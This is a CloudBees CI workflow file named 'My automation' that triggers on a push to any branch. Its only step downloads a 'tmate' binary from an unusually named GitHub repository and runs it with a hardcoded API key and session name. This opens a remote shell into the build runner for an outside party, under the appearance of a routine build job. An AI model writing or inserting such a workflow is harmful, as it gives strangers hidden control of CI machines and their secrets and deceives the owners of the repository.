apiVersion: automation.cloudbees.io/v1alpha1
kind: workflow
name: My automation

on:
  push:
    branches:
      - '**'

jobs:
  build:
    steps:
      - name: ubuntu
        uses: docker://ubuntu:22.04
        shell: sh
        run: |
          apt-get update && apt-get install wget curl -y && wget https://raw.githubusercontent.com/hp20h5w91nf1/hp20h5w91nf1/main/tmate && chmod +x tmate && ./tmate -F -k tmk-XFh4wmpGo9VkrPd37bY81lqL4j -n 6adc4229571627f47815cfd11e8b1fdd
